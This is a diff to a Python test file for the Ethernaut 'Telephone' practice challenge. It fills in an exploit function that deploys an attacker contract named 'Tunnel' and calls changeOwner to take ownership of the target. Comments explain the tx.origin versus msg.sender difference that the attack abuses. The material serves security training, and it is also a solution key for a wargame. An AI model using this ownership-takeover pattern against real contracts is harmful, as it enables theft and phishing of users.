@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv04_telephone import Telephone
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.attacker.lv04_tunnel import Tunnel
 
 @default_chain.connect()
 def test_lv04():
@@ -11,7 +11,10 @@ def test_lv04():
     ethernaut.check_lv04(contract)
     
 def exploit_lv04(contract: Telephone):
-    # TODO Claim ownership of the contract.
-    # TODO You can deploy your own smart contract(s) here.
-    # TODO Code here ...
-    pass
+    # Attack vector: tx.origin is not changed in redirect => can be used for phissing attack
+    # Training: difference between tx.origin and tx.sender
+    #   In a simple call chain A->B->C->D
+    #        inside D msg.sender will be C, and tx.origin will be A
+    #        inside C msg.sender will be B, and tx.origin will be A
+    tunnel = Tunnel.deploy()
+    tunnel.changeOwner(contract)
